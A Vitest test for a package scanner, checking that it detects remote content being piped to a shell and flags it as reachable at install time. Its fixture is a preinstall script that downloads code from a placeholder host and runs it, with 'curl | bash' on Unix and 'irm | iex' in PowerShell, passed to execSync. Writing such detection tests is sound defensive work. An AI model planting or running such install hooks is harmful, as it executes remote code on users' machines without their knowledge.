import { describe, expect, it } from "vitest";
import { analysePackage } from "../analyse.js";

describe("shell command binding recovery", () => {
  it("recovers curl|bash assigned to a binding then passed to execSync", () => {
    const result = analysePackage({
      files: [
        {
          path: "setup.js",
          content: `
const { execSync } = require("child_process");
let command;
if (process.platform === "win32") {
  command = 'powershell -c "irm https://example.invalid/install.ps1|iex"';
} else {
  command = "curl -fsSL https://example.invalid/install | bash";
}
execSync(command, { stdio: "ignore" });
`,
        },
      ],
      scripts: { preinstall: "node setup.js" },
      manifestText: JSON.stringify({
        name: "x",
        version: "1.0.0",
        scripts: { preinstall: "node setup.js" },
      }),
    });

    expect(
      result.findings.some((f) => f.ruleId === "js/shell/remote-content-to-shell"),
    ).toBe(true);
    expect(
      result.findings.some(
        (f) =>
          f.ruleId === "js/shell/remote-content-to-shell" &&
          f.metadata.installReachable === true,
      ),
    ).toBe(true);
  });
});
